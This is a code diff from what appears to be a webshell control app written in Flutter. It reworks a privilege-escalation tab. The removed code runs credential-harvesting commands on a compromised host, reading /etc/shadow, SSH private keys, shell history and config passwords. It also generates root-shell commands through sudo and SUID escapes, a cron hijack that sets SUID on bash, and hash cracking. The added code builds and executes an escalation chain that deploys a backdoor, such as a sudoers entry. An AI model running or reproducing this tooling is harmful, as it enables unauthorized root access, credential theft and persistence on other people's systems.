@@ -3,48 +3,11 @@ import 'package:flutter/services.dart';
 
 import '../services/webshell_service.dart';
 import '../theme/app_theme.dart';
-class _PrivEscSuggestion {
-  final String title;
-  final String reason;
-  final List<String> commands;
-
-  /// true = 条件已自动验证，执行建议命令可 100% 提权
-  final bool verified;
-  const _PrivEscSuggestion({
-    required this.title,
-    required this.reason,
-    required this.commands,
-    this.verified = true,
-  });
-}
-
-class _PrivEscItem {
-  final String id;
-  final String name;
-  final String command;
-  final String description;
-  const _PrivEscItem({
-    required this.id,
-    required this.name,
-    required this.command,
-    required this.description,
-  });
-}
-
-class _PrivEscGroup {
-  final String id;
-  final String title;
-  final IconData icon;
-  final Color color;
-  final List<_PrivEscItem> items;
-  const _PrivEscGroup({
-    required this.id,
-    required this.title,
-    required this.icon,
-    required this.color,
-    required this.items,
-  });
-}
+import 'priv_esc_engine.dart';
+import 'priv_esc_landing.dart';
+import 'priv_esc_risk.dart';
+import 'priv_esc_risk_list.dart';
+import 'priv_esc_vectors.dart';
 
 class PrivEscTab extends StatefulWidget {
   final WebshellService service;
@@ -56,474 +19,64 @@ class PrivEscTab extends StatefulWidget {
 
 class _PrivEscTabState extends State<PrivEscTab>
     with AutomaticKeepAliveClientMixin {
-  final Map<String, String?> _results = {};
-  final Map<String, bool> _running = {};
+  List<PrivEscRisk> _confirmedRisks = const [];
   bool _runningAll = false;
-
-  static List<_PrivEscGroup> get _groups => [
-    _PrivEscGroup(
-      id: 'current_priv',
-      title: 'Current privileges',
-      icon: Icons.person_outline,
-      color: AppColors.primary,
-      items: [
-        _PrivEscItem(
-          id: 'user_group',
-          name: 'User & group',
-          command: 'id && whoami',
-          description: 'Current user UID/GID and groups',
-        ),
-        _PrivEscItem(
-          id: 'sudo',
-          name: 'Sudo privileges',
-          command: 'sudo -l 2>&1',
-          description: 'Commands executable via sudo without password',
-        ),
-        _PrivEscItem(
-          id: 'env',
-          name: 'Environment variables',
-          command: 'env 2>/dev/null',
-          description: 'Environment variables may contain credentials',
-        ),
-      ],
-    ),
-    _PrivEscGroup(
-      id: 'sys_info',
-      title: 'System info',
-      icon: Icons.computer_outlined,
-      color: AppColors.cyan,
-      items: [
-        _PrivEscItem(
-          id: 'kernel',
-          name: 'Kernel version',
-          command: 'uname -a',
-          description: 'Check kernel version to match local privilege escalation exploits',
-        ),
-        _PrivEscItem(
-          id: 'distro',
-          name: 'Distribution',
-          command:
-              'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
-          description: 'Linux distribution and version',
-        ),
-        _PrivEscItem(
-          id: 'logged_users',
-          name: 'Logged-in users',
-          command: 'w 2>/dev/null || who 2>/dev/null',
-          description: 'Current active sessions',
-        ),
-        _PrivEscItem(
-          id: 'root_procs',
-          name: 'Processes running as root',
-          command: 'ps aux 2>/dev/null | grep "^root" | head -20',
-          description: 'Service processes running as root',
-        ),
-      ],
-    ),
-    _PrivEscGroup(
-      id: 'esc_vectors',
-      title: 'Escalation vectors',
-      icon: Icons.security_outlined,
-      color: const Color(0xFFFF9800),
-      items: [
-        _PrivEscItem(
-          id: 'suid',
-          name: 'SUID files',
-          command: r'find / -perm -4000 -type f 2>/dev/null | head -30',
-          description: 'Executables with SUID bit set (may be used for escalation)',
-        ),
-        _PrivEscItem(
-          id: 'sgid',
-          name: 'SGID files',
-          command: r'find / -perm -2000 -type f 2>/dev/null | head -20',
-          description: 'Executables with SGID bit set',
-        ),
-        _PrivEscItem(
-          id: 'capabilities',
-          name: 'Capabilities',
-          command: 'getcap -r / 2>/dev/null',
-          description: 'Files with Linux capabilities',
-        ),
-        _PrivEscItem(
-          id: 'cron',
-          name: 'Cron jobs',
-          command:
-              'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
-          description: 'Scheduled task configuration and scripts',
-        ),
-        _PrivEscItem(
-          id: 'cron_writable',
-          name: 'Writable cron scripts',
-          command:
-              r'find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron \( -type f -o -type l \) 2>/dev/null -exec sh -c "m=$(stat -c \"%a\" \"$1\" 2>/dev/null);u=$(stat -c \"%u\" \"$1\" 2>/dev/null);g=$(stat -c \"%g\" \"$1\" 2>/dev/null);myu=$(id -u);o=$((m/100));gr=$((m/10%10));t=$((m%10));[ $((t&2)) -ne 0 ] && echo \"$1\";[ \"$u\" = \"$myu\" ] && [ $((o&2)) -ne 0 ] && echo \"$1\";id -G | tr \" \" \"\n\" | grep -q \"^${g}$\" && [ $((gr&2)) -ne 0 ] && echo \"$1\"" _ {} \;',
-          description: 'Writable by current user/group based on permission bits (read-only check, no side effects)',
-        ),
-        _PrivEscItem(
-          id: 'writable_dirs',
-          name: 'Writable directories',
-          command:
-              r"find / -writable -type d 2>/dev/null | grep -Ev '/proc|/sys|/dev|/run' | head -20",
-          description: 'Directories writable by the current user',
-        ),
-        _PrivEscItem(
-          id: 'path_hijack',
-          name: 'PATH hijacking',
-          command:
-              r'echo $PATH && find $(echo $PATH | tr ":" " ") -writable 2>/dev/null',
-          description: 'Check for writable directories in PATH',
-        ),
-      ],
-    ),
-    _PrivEscGroup(
-      id: 'sensitive_info',
-      title: 'Sensitive information',
-      icon: Icons.key_outlined,
-      color: AppColors.red,
-      items: [
-        _PrivEscItem(
-          id: 'loginable_accounts',
-          name: 'Loginable accounts',
-          command:
-              r"cat /etc/passwd | grep -Ev 'nologin|false|sync|halt|shutdown'",
-          description: 'User accounts that can log in normally',
-        ),
-        _PrivEscItem(
-          id: 'shadow',
-          name: 'Shadow file',
-          command: 'cat /etc/shadow 2>/dev/null',
-          description: 'Attempt to read password hashes (requires root)',
-        ),
-        _PrivEscItem(
-          id: 'history',
-          name: 'Command history',
-          command:
-              'cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null | head -40',
-          description: 'Command history may contain plaintext credentials',
-        ),
-        _PrivEscItem(
-          id: 'ssh_keys',
-          name: 'SSH keys',
-          command:
-              'ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null | head -5',
-          description: 'Whether private key files are readable',
-        ),
-        _PrivEscItem(
-          id: 'config_passwords',
-          name: 'Config file passwords',
-          command:
-              r"grep -rls 'password\|passwd\|pass=' /var/www /etc 2>/dev/null | head -10 | xargs grep -h 'password\|passwd' 2>/dev/null | grep -v '^#' | head -20",
-          description: 'Plaintext passwords in web/system config files',
-        ),
-      ],
-    ),
-  ];
-
-  String _key(String group, String item) => '$group/$item';
-
-  Future<void> _runCheck(_PrivEscGroup group, _PrivEscItem item) async {
-    final key = _key(group.id, item.id);
-    setState(() => _running[key] = true);
-    try {
-      final out = await widget.service.executeCommand(item.command);
-      if (mounted) {
-        setState(() {
-          _results[key] = out.trim().isEmpty ? '(no output)' : out.trim();
-          _running[key] = false;
-        });
-      }
-    } catch (e) {
-      if (mounted) {
-        setState(() {
-          _results[key] = '[Error] $e';
-          _running[key] = false;
-        });
-      }
-    }
-  }
-
-  Future<void> _runAll() async {
-    setState(() => _runningAll = true);
-    for (final g in _groups) {
-      for (final item in g.items) {
-        await _runCheck(g, item);
-      }
-    }
-    if (mounted) setState(() => _runningAll = false);
-  }
-
-  void _clearAll() => setState(() {
-    _results.clear();
-    _running.clear();
-  });
-
-  /// 根据检查结果分析并生成提权建议（解析实际路径/命令，提高准确性）
-  List<_PrivEscSuggestion> _analyzeResults() {
-    final suggestions = <_PrivEscSuggestion>[];
-    String res(String g, String i) => _results[_key(g, i)] ?? '';
-
-    // 1. Sudo 提权
-    final sudo = res('current_priv', 'sudo');
-    if (sudo.isNotEmpty &&
-        !sudo.contains('Permission denied') &&
-        sudo.contains('NOPASSWD')) {
-      if (sudo.contains('(ALL)') || sudo.contains('ALL')) {
-        suggestions.add(
-          _PrivEscSuggestion(
-            title: 'Sudo passwordless escalation',
-            reason: 'Detected sudo can run ALL without password. Direct escalation:',
-            commands: ['sudo su', 'sudo -i', 'sudo bash'],
-          ),
-        );
-      } else {
-        // 解析 sudo -l 输出中的具体命令路径
-        final cmdMatches = RegExp(
-          r'NOPASSWD:\s*([^\s,]+)',
-          multiLine: true,
-        ).allMatches(sudo);
-        final paths = cmdMatches
-            .map((m) => m.group(1)?.trim())
-            .whereType<String>()
-            .where((s) => s.startsWith('/'))
-            .toSet()
-            .toList();
-        final cmds = <String>[];
-        for (final p in paths.take(5)) {
-          final base = p.split('/').last.split('.').first.toLowerCase();
-          if (base.contains('find')) {
-            cmds.add('sudo $p . -exec /bin/sh -p \\; -quit');
-          } else if (base.contains('vim') || base.contains('vi')) {
-            cmds.add('sudo $p -c \':!/bin/sh\'');
-          } else if (base.contains('python')) {
-            cmds.add('sudo $p -c \'import os; os.execl("/bin/sh","sh","-p")\'');
-          } else if (base.contains('perl')) {
-            cmds.add('sudo $p -e \'exec "/bin/sh";\'');
-          } else if (base.contains('nmap')) {
-            cmds.add('sudo $p --interactive');
-            cmds.add('# !sh');
-          } else if (base.contains('awk')) {
-            cmds.add('sudo $p \'BEGIN {system("/bin/sh -p")}\'');
-          } else if (base.contains('less') || base.contains('more')) {
-            cmds.add('sudo $p /etc/shadow');
-            cmds.add('# !/bin/sh');
-          } else {
-            cmds.add('# $p → https://gtfobins.github.io');
-          }
-        }
-        if (cmds.isEmpty) {
-          cmds.add('# https://gtfobins.github.io');
-        }
-        suggestions.add(
-          _PrivEscSuggestion(
-            title: 'Sudo limited command escalation',
-            reason: 'Detected passwordless sudo: ${'${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}'}',
-            commands: cmds,
-          ),
-        );
-      }
-    }
-
-    // 2. SUID 提权（解析实际路径，使用完整路径执行）
-    final suid = res('esc_vectors', 'suid');
-    if (suid.isNotEmpty &&
-        suid != '(no output)' &&
-        !suid.startsWith('[Error]')) {
-      final pathRegex = RegExp(r'(/[^\s]+)');
-      final paths = pathRegex
-          .allMatches(suid)
-          .map((m) => m.group(1)!)
-          .where((p) => !p.contains('*'))
-          .toSet()
-          .toList();
-      final cmds = <String>[];
-      for (final path in paths.take(15)) {
-        final base = path.split('/').last.toLowerCase();
-        if (base.contains('find')) {
-          cmds.add('cd /tmp && $path . -exec /bin/sh -p \\; -quit');
-          break; // 一个足够
-        }
-      }
-      if (cmds.isEmpty) {
-        for (final path in paths.take(15)) {
-          final base = path.split('/').last.toLowerCase();
-          if (base.contains('vim') || base == 'vi') {
-            cmds.add('$path -c \':!/bin/sh\'');
-            break;
-          }
-        }
-      }
-      if (cmds.isEmpty) {
-        for (final path in paths.take(15)) {
-          final base = path.split('/').last.toLowerCase();
-          if (base.contains('python')) {
-            cmds.add('$path -c \'import os; os.execl("/bin/sh","sh","-p")\'');
-            break;
-          }
-        }
-      }
-      if (cmds.isEmpty) {
-        for (final path in paths.take(15)) {
-          final base = path.split('/').last.toLowerCase();
-          if (base.contains('nmap')) {
-            cmds.add('$path --interactive');
-            cmds.add('# !sh');
-            break;
-          }
-        }
-      }
-      if (cmds.isEmpty) {
-        for (final path in paths.take(15)) {
-          final base = path.split('/').last.toLowerCase();
-          if (base.contains('perl')) {
-            cmds.add('$path -e \'exec "/bin/sh";\'');
-            break;
-          }
-        }
-      }
-      if (cmds.isEmpty) {
-        for (final path in paths.take(15)) {
-          final base = path.split('/').last.toLowerCase();
-          if (base == 'bash') {
-            cmds.add('$path -p');
-            break;
-          }
-        }
-      }
-      if (cmds.isNotEmpty) {
-        suggestions.add(
-          _PrivEscSuggestion(
-            title: 'SUID escalation',
-            reason: 'Found exploitable SUID files. Execute in terminal (requires writable directory):',
-            commands: cmds,
-          ),
-        );
-      }
-    }
-
-    // 3. 内核 EXP（需本地查找 exploit，非 100%）
-    final uname = res('sys_info', 'kernel');
-    if (uname.isNotEmpty &&
-        uname != '(no output)' &&
-        !uname.startsWith('[Error]')) {
-      final verMatch = RegExp(r'(\d+\.\d+\.\d+)').firstMatch(uname);
-      final archMatch = RegExp(r'(x86_64|i686|aarch64|arm)').firstMatch(uname);
-      if (verMatch != null) {
-        final arch = archMatch?.group(1) ?? 'x86_64';
-        suggestions.add(
-          _PrivEscSuggestion(
-            title: 'Kernel escalation (find exploit locally)',
-            reason: 'Kernel ${verMatch.group(1)!} ($arch). Search for matching CVE locally',
-            commands: [
-              'searchsploit Linux Kernel ${verMatch.group(1)}',
-              '# https://www.exploit-db.com/search?q=${Uri.encodeComponent('Linux Kernel ${verMatch.group(1)}')}',
-            ],
-            verified: false,
-          ),
-        );
-      }
-    }
-
-    // 4. Shadow 破解（需本地破解，成功率取决于密码强度）
-    final shadow = res('sensitive_info', 'shadow');
-    if (shadow.isNotEmpty &&
-        shadow != '(no output)' &&
-        !shadow.startsWith('[Error]') &&
-        !shadow.contains('Permission denied') &&
-        RegExp(r'root:\$[156]\$').hasMatch(shadow)) {
-      final hashMode = shadow.contains(r'$6$')
-          ? ('1800', 'sha512crypt')
-          : shadow.contains(r'$5$')
-          ? ('7400', 'sha256crypt')
-          : ('500', 'md5crypt');
-      suggestions.add(
-        _PrivEscSuggestion(
-          title: 'Password hash cracking (crack locally)',
-          reason: 'Obtained shadow. Crack locally (${hashMode.$2}). Success rate depends on password strength',
-          commands: [
-            'unshadow /etc/passwd /etc/shadow > hashes.txt',
-            'john hashes.txt',
-            '# hashcat: hashcat -m ${hashMode.$1} hashes.txt wordlist.txt',
-          ],
-          verified: false,
-        ),
-      );
-    }
-
-    // 5. Cron 脚本劫持（仅当检测到可写文件时建议，100% 可提权）
-    final cronWritable = res('esc_vectors', 'cron_writable');
-    if (cronWritable.isNotEmpty &&
-        cronWritable != '(no output)' &&
-        !cronWritable.startsWith('[Error]')) {
-      final writablePaths = cronWritable
-          .split('\n')
-          .map((s) => s.trim())
-          .where((s) => s.startsWith('/'))
-          .toSet()
-          .take(5)
-          .toList();
-      if (writablePaths.isNotEmpty) {
-        final cmds = <String>[
-          '# Create SUID payload, then overwrite writable cron files:',
-          r"printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/_mx",
-          ...writablePaths.map((p) => 'cp /tmp/_mx $p'),
-          '# Wait for cron to run (usually within 1 min), then:',
-          '/bin/bash -p',
-        ];
-        suggestions.add(
-          _PrivEscSuggestion(
-            title: 'Cron hijacking (write access confirmed)',
-            reason: 'Auto-detected writable cron files: ${'${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}'}',
-            commands: cmds,
-          ),
-        );
-      }
-    }
-
-    // 5b. PATH 劫持（需等待命令被调用，非 100% 不加入主建议）
-
-    // 6. Capabilities 提权（解析实际二进制路径）
-    final cap = res('esc_vectors', 'capabilities');
-    if (cap.isNotEmpty &&
-        cap != '(no output)' &&
-        !cap.startsWith('[Error]') &&
-        cap.contains('cap_setuid')) {
-      final paths = RegExp(r'(\S+)\s*=\s*.*cap_setuid')
-          .allMatches(cap)
-          .map((m) => m.group(1))
-          .whereType<String>()
-          .where((s) => s.startsWith('/'))
-          .toSet()
-          .take(5)
-          .toList();
-      final cmds = <String>[];
-      if (paths.isNotEmpty) {
-        for (final p in paths) {
-          cmds.add('$p -p');
-          cmds.add('# Or: $p --help');
-        }
-      } else {
-        cmds.add('getcap -r / 2>/dev/null');
-        cmds.add('# find cap_setuid binary then: /path/to/binary -p');
-      }
-      suggestions.add(
-        _PrivEscSuggestion(
-          title: 'Capabilities escalation',
-          reason: 'Found cap_setuid. Execute the path above directly:',
-          commands: cmds,
-        ),
-      );
-    }
-
-    return suggestions;
-  }
+  bool _scanHasRun = false;
+  bool _scanIncomplete = false;
+  int _completedChecks = 0;
+  String _currentUser = '';
 
   @override
   bool get wantKeepAlive => true;
 
+  Future<void> _runAll() async {
+    setState(() {
+      _runningAll = true;
+      _completedChecks = 0;
+      _scanIncomplete = false;
+    });
+
+    final scanner = PrivEscScanner(widget.service);
+    final result = await scanner.scan(
+      onProgress: (done, total) {
+        if (mounted) setState(() => _completedChecks = done);
+      },
+    );
+
+    if (mounted) {
+      setState(() {
+        _confirmedRisks = result.risks;
+        _runningAll = false;
+        _scanHasRun = true;
+        _scanIncomplete = result.incomplete;
+        _currentUser = result.currentUser;
+      });
+    }
+  }
+
+  void _clearAll() => setState(() {
+    _confirmedRisks = const [];
+    _scanHasRun = false;
+    _scanIncomplete = false;
+    _completedChecks = 0;
+    _currentUser = '';
+  });
+
+  Future<void> _onExecutePressed(PrivEscRisk risk) async {
+    await showDialog<void>(
+      context: context,
+      builder: (_) => _PrivEscExecuteDialog(
+        service: widget.service,
+        risk: risk,
+        currentUser: _currentUser,
+      ),
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
     super.build(context);
-    final doneCount = _results.length;
-    final totalCount = _groups.fold(0, (s, g) => s + g.items.length);
+    final totalCount = vectors.length;
 
     return Column(
       children: [
@@ -535,10 +88,10 @@ class _PrivEscTabState extends State<PrivEscTab>
               const Icon(Icons.shield_outlined, color: AppColors.red, size: 16),
               const SizedBox(width: 8),
               Text(
-                'Privilege escalation checks',
+                '提权风险扫描',
                 style: AppTextStyles.heading(size: 14, color: AppColors.red),
               ),
-              if (doneCount > 0) ...[
+              if (_runningAll || _scanHasRun) ...[
                 const SizedBox(width: 8),
                 Container(
                   padding: const EdgeInsets.symmetric(
@@ -550,7 +103,9 @@ class _PrivEscTabState extends State<PrivEscTab>
                     borderRadius: BorderRadius.circular(4),
                   ),
                   child: Text(
-                    '$doneCount/$totalCount',
+                    _runningAll
+                        ? '正在扫描 $_completedChecks / $totalCount'
+                        : '确认 ${_confirmedRisks.length} 个风险点',
                     style: AppTextStyles.caption(
                       size: 11,
                       color: AppColors.red,
@@ -559,11 +114,11 @@ class _PrivEscTabState extends State<PrivEscTab>
                 ),
               ],
               const Spacer(),
-              if (doneCount > 0)
+              if (_confirmedRisks.isNotEmpty)
                 TextButton.icon(
                   onPressed: _runningAll ? null : _clearAll,
                   icon: const Icon(Icons.delete_sweep_outlined, size: 14),
-                  label: Text('Clear'),
+                  label: const Text('清空结果'),
                   style: TextButton.styleFrom(
                     foregroundColor: AppColors.textSecondary,
                     padding: const EdgeInsets.symmetric(horizontal: 8),
@@ -582,7 +137,9 @@ class _PrivEscTabState extends State<PrivEscTab>
                         ),
                       )
                     : const Icon(Icons.play_arrow_rounded, size: 15),
-                label: Text(_runningAll ? 'Checking…' : 'Check all'),
+                label: Text(
+                  _runningAll ? '扫描中…' : (_scanHasRun ? '重新扫描' : '开始扫描'),
+                ),
                 style: FilledButton.styleFrom(
                   backgroundColor: AppColors.red,
                   foregroundColor: Colors.white,
@@ -597,44 +154,26 @@ class _PrivEscTabState extends State<PrivEscTab>
           ),
         ),
         Expanded(
-          child: Builder(
-            builder: (context) {
-              final suggestions = _analyzeResults()
-                ..sort(
-                  (a, b) => (b.verified ? 1 : 0).compareTo(a.verified ? 1 : 0),
-                );
-              return ListView(
-                padding: const EdgeInsets.symmetric(
-                  horizontal: 16,
-                  vertical: 12,
-                ),
-                children: [
-                  if (suggestions.isNotEmpty)
-                    _PrivEscSuggestionsCard(
-                      suggestions: suggestions,
-                      onCopy: (cmd) {
-                        Clipboard.setData(ClipboardData(text: cmd));
-                        ScaffoldMessenger.of(context).showSnackBar(
-                          SnackBar(
-                            content: Text('Copied to clipboard'),
-                            duration: const Duration(seconds: 1),
-                            behavior: SnackBarBehavior.floating,
-                          ),
-                        );
-                      },
+          child: ListView(
+            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+            children: [
+              PrivEscRiskList(
+                risks: _confirmedRisks,
+                scanIncomplete: _scanIncomplete,
+                hasScanned: _scanHasRun,
+                onCopy: (cmd) {
+                  Clipboard.setData(ClipboardData(text: cmd));
+                  ScaffoldMessenger.of(context).showSnackBar(
+                    SnackBar(
+                      content: const Text('已复制到剪贴板'),
+                      duration: const Duration(seconds: 1),
+                      behavior: SnackBarBehavior.floating,
                     ),
-                  ..._groups.map(
-                    (group) => _PrivEscGroupWidget(
-                      group: group,
-                      results: _results,
-                      running: _running,
-                      keyOf: _key,
-                      onRun: (item) => _runCheck(group, item),
-                    ),
-                  ),
-                ],
-              );
-            },
+                  );
+                },
+                onExecute: _onExecutePressed,
+              ),
+            ],
           ),
         ),
       ],
@@ -642,375 +181,321 @@ class _PrivEscTabState extends State<PrivEscTab>
   }
 }
 
-class _PrivEscSuggestionsCard extends StatelessWidget {
-  final List<_PrivEscSuggestion> suggestions;
-  final void Function(String) onCopy;
-
-  const _PrivEscSuggestionsCard({
-    required this.suggestions,
-    required this.onCopy,
+/// Dialog that lets the user pick a landing method, fill params, preview the
+/// generated chain, then execute it and show the result.
+class _PrivEscExecuteDialog extends StatefulWidget {
+  const _PrivEscExecuteDialog({
+    required this.service,
+    required this.risk,
+    required this.currentUser,
   });
+
+  final WebshellService service;
+  final PrivEscRisk risk;
+  final String currentUser;
+
+  @override
+  State<_PrivEscExecuteDialog> createState() => _PrivEscExecuteDialogState();
+}
+
+class _PrivEscExecuteDialogState extends State<_PrivEscExecuteDialog> {
+  late final LandingMethod? _fixedLanding;
+  late LandingMethod _selected;
+  late final Map<String, TextEditingController> _controllers;
+  bool _executing = false;
+  PrivEscChainResult? _result;
+
+  PrivEscCandidate get _candidate => widget.risk.candidate!;
+
+  @override
+  void initState() {
+    super.initState();
+    _fixedLanding = _resolveFixedLanding();
+    _selected = _fixedLanding ?? landingMethods.first;
+    _controllers = {
+      for (final p in _selected.params)
+        p.id: TextEditingController(text: p.defaultValue),
+    };
+  }
+
+  LandingMethod? _resolveFixedLanding() {
+    if (_candidate.gtfo != null) return null; // primitive — landing selectable
+    for (final v in vectors) {
+      if (v.id == _candidate.vectorId) return v.directLanding;
+    }
+    return null;
+  }
+
+  @override
+  void dispose() {
+    for (final c in _controllers.values) {
+      c.dispose();
+    }
+    super.dispose();
+  }
+
+  Map<String, String> _collectParams() {
+    final params = <String, String>{
+      for (final e in _controllers.entries) e.key: e.value.text,
+    };
+    // sudoers landing: default the target user to the scanned current user.
+    if (_selected.id == 'sudoers_nopasswd' && (params['user'] ?? '').isEmpty) {
+      params['user'] = widget.currentUser.isEmpty ? 'REPLACE_USER' : widget.currentUser;
+    }
+    return params;
+  }
+
+  PrivEscChain _buildChain() => buildChain(
+    candidate: _candidate,
+    landing: _selected,
+    params: _collectParams(),
+  );
+
+  Future<void> _execute() async {
+    setState(() => _executing = true);
+    final chain = _buildChain();
+    final result = await executeChain(widget.service, chain);
+    if (mounted) {
+      setState(() {
+        _executing = false;
+        _result = result;
+      });
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
-    return Container(
-      margin: const EdgeInsets.only(bottom: 20),
-      padding: const EdgeInsets.all(14),
-      decoration: BoxDecoration(
-        color: AppColors.primary.withValues(alpha: 0.06),
-        borderRadius: BorderRadius.circular(10),
-        border: Border.all(color: AppColors.primary.withValues(alpha: 0.35)),
-      ),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
+    final chain = _buildChain();
+    return AlertDialog(
+      title: Row(
         children: [
-          Row(
-            children: [
-              Icon(Icons.lightbulb_outline, size: 18, color: AppColors.primary),
-              const SizedBox(width: 8),
-              Text(
-                'Privilege escalation suggestions (based on results)',
-                style: AppTextStyles.heading(
-                  size: 14,
-                  color: AppColors.primary,
-                ),
-              ),
-            ],
+          const Icon(Icons.admin_panel_settings_outlined,
+              color: AppColors.red, size: 20),
+          const SizedBox(width: 8),
+          Expanded(
+            child: Text(
+              '执行提权链',
+              style: AppTextStyles.heading(size: 15),
+            ),
           ),
-          const SizedBox(height: 12),
-          ...suggestions.map(
-            (s) => Padding(
-              padding: const EdgeInsets.only(bottom: 12),
-              child: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Row(
-                    children: [
-                      Expanded(
-                        child: Text(
-                          s.title,
-                          style: AppTextStyles.body(
-                            size: 13,
-                            color: AppColors.textPrimary,
-                          ).copyWith(fontWeight: FontWeight.w600),
-                        ),
-                      ),
-                      if (s.verified)
-                        Container(
-                          padding: const EdgeInsets.symmetric(
-                            horizontal: 6,
-                            vertical: 2,
-                          ),
-                          decoration: BoxDecoration(
-                            color: AppColors.primary.withValues(alpha: 0.2),
-                            borderRadius: BorderRadius.circular(4),
-                          ),
-                          child: Text(
-                            '100%',
-                            style: AppTextStyles.caption(
-                              size: 10,
-                              color: AppColors.primary,
-                            ),
-                          ),
-                        ),
-                    ],
+        ],
+      ),
+      content: SizedBox(
+        width: 560,
+        child: SingleChildScrollView(
+          child: Column(
+            mainAxisSize: MainAxisSize.min,
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Text(
+                widget.risk.evidence,
+                style: AppTextStyles.caption(size: 12, color: AppColors.textMuted),
+              ),
+              const SizedBox(height: 12),
+
+              // Landing selection (fixed for fused vectors).
+              if (_fixedLanding != null)
+                _LandingTile(landing: _fixedLanding)
+              else
+                for (final lm in landingMethods)
+                  RadioListTile<LandingMethod>(
+                    dense: true,
+                    contentPadding: EdgeInsets.zero,
+                    title: Text(lm.name,
+                        style: AppTextStyles.body(size: 13)),
+                    subtitle: Text(lm.description,
+                        style: AppTextStyles.caption(size: 11)),
+                    value: lm,
+                    groupValue: _selected,
+                    onChanged: _executing
+                        ? null
+                        : (v) {
+                            setState(() {
+                              _selected = v!;
+                              for (final c in _controllers.values) {
+                                c.dispose();
+                              }
+                              _controllers
+                                ..clear()
+                                ..addAll({
+                                  for (final p in _selected.params)
+                                    p.id: TextEditingController(
+                                        text: p.defaultValue),
+                                });
+                            });
+                          },
                   ),
-                  const SizedBox(height: 2),
-                  Text(
-                    s.reason,
-                    style: AppTextStyles.caption(
-                      size: 11,
-                      color: AppColors.textMuted,
+
+              const SizedBox(height: 8),
+              for (final p in _selected.params)
+                Padding(
+                  padding: const EdgeInsets.only(bottom: 8),
+                  child: TextField(
+                    controller: _controllers[p.id],
+                    enabled: !_executing,
+                    decoration: InputDecoration(
+                      labelText: p.label,
+                      hintText: p.hint,
+                      isDense: true,
+                      border: const OutlineInputBorder(),
                     ),
                   ),
-                  const SizedBox(height: 6),
-                  ...s.commands.map((cmd) {
-                    final isComment = cmd.startsWith('#');
-                    return Padding(
-                      padding: const EdgeInsets.only(bottom: 4),
-                      child: Row(
-                        crossAxisAlignment: CrossAxisAlignment.start,
-                        children: [
-                          Expanded(
-                            child: Container(
-                              padding: const EdgeInsets.symmetric(
-                                horizontal: 8,
-                                vertical: 6,
-                              ),
-                              decoration: BoxDecoration(
-                                color: isComment
-                                    ? AppColors.bgDark
-                                    : AppColors.bgCard,
-                                borderRadius: BorderRadius.circular(4),
-                                border: Border.all(
-                                  color: isComment
-                                      ? AppColors.border
-                                      : AppColors.primary.withValues(
-                                          alpha: 0.3,
-                                        ),
-                                ),
-                              ),
-                              child: SelectableText(
-                                cmd,
-                                style: TextStyle(
-                                  fontFamily: 'Monaco',
-                                  fontFamilyFallback: const [
-                                    'Courier New',
-                                    'monospace',
-                                  ],
-                                  fontSize: 11,
-                                  color: isComment
-                                      ? AppColors.textMuted
-                                      : AppColors.cyan,
-                                ),
-                              ),
-                            ),
-                          ),
-                          if (!isComment) ...[
-                            const SizedBox(width: 6),
-                            IconButton(
-                              onPressed: () => onCopy(cmd),
-                              icon: const Icon(Icons.copy_outlined, size: 16),
-                              style: IconButton.styleFrom(
-                                foregroundColor: AppColors.textSecondary,
-                                padding: const EdgeInsets.all(4),
-                                minimumSize: const Size(28, 28),
-                              ),
-                              tooltip: 'Copy',
-                            ),
-                          ],
-                        ],
-                      ),
-                    );
-                  }),
-                ],
+                ),
+
+              const SizedBox(height: 8),
+              _CommandPreview(
+                label: '执行命令（提权 + 落地后门）',
+                command: chain.deployCommand,
               ),
-            ),
-          ),
-        ],
-      ),
-    );
-  }
-}
+              const SizedBox(height: 8),
+              _CommandPreview(
+                label: '验证命令',
+                command: chain.verifyCommand,
+              ),
 
-class _PrivEscGroupWidget extends StatelessWidget {
-  final _PrivEscGroup group;
-  final Map<String, String?> results;
-  final Map<String, bool> running;
-  final String Function(String, String) keyOf;
-  final void Function(_PrivEscItem) onRun;
-
-  const _PrivEscGroupWidget({
-    required this.group,
-    required this.results,
-    required this.running,
-    required this.keyOf,
-    required this.onRun,
-  });
-
-  @override
-  Widget build(BuildContext context) {
-    return Padding(
-      padding: const EdgeInsets.only(bottom: 16),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
-        children: [
-          Padding(
-            padding: const EdgeInsets.only(bottom: 8),
-            child: Row(
-              children: [
-                Icon(group.icon, size: 14, color: group.color),
-                const SizedBox(width: 6),
-                Text(
-                  group.title,
-                  style: AppTextStyles.heading(size: 13, color: group.color),
-                ),
-                const SizedBox(width: 8),
-                Expanded(
-                  child: Divider(
-                    color: group.color.withValues(alpha: 0.25),
-                    height: 1,
-                  ),
-                ),
+              if (_result != null) ...[
+                const SizedBox(height: 12),
+                _ResultBlock(result: _result!),
               ],
-            ),
+            ],
           ),
-          ...group.items.map((item) {
-            final key = keyOf(group.id, item.id);
-            return _PrivEscItemWidget(
-              item: item,
-              color: group.color,
-              isRunning: running[key] == true,
-              result: results[key],
-              onRun: () => onRun(item),
-            );
-          }),
-        ],
-      ),
-    );
-  }
-}
-
-class _PrivEscItemWidget extends StatelessWidget {
-  final _PrivEscItem item;
-  final Color color;
-  final bool isRunning;
-  final String? result;
-  final VoidCallback onRun;
-
-  const _PrivEscItemWidget({
-    required this.item,
-    required this.color,
-    required this.isRunning,
-    required this.result,
-    required this.onRun,
-  });
-
-  @override
-  Widget build(BuildContext context) {
-    final hasResult = result != null;
-    final isError = result?.startsWith('[Error]') == true;
-    final isNoOutput = result == '(no output)';
-
-    return Container(
-      margin: const EdgeInsets.only(bottom: 8),
-      decoration: BoxDecoration(
-        color: AppColors.bgCard,
